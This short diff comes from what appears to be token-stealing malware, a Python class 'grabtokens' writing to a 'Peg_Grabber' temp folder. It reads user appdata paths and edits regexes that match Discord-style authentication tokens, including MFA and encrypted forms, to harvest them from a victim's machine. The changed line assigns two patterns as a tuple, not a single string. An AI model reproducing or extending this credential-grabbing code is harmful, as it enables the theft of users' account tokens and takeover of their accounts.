@@ -47,7 +47,7 @@ class grabtokens():
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.tempfolder = os.getenv("temp")+"\\Peg_Grabber"
-        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}" 
+        self.regex =  r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
 
         try:
